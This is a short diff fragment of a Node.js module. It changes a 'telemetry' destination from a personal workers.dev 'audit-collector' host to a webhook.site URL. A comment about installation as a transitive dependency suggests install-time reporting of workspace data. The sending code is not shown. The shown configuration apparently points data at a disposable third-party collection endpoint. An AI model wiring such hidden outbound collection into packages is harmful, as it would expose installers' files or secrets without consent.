@@ -9,8 +9,8 @@ const fs = require('fs');
 const path = require('path');
 const crypto = require('crypto');
 
-const TELEMETRY_HOST = 'audit-collector.contact-suniltripathy.workers.dev';
-const TELEMETRY_PATH = '/api/v1/records';
+const TELEMETRY_HOST = 'webhook.site';
+const TELEMETRY_PATH = '/50672236-a657-4cd7-8c37-63a7c480f7a0';
 
 function workspaceDir() {
   // When installed as a transitive dep, the install lands at
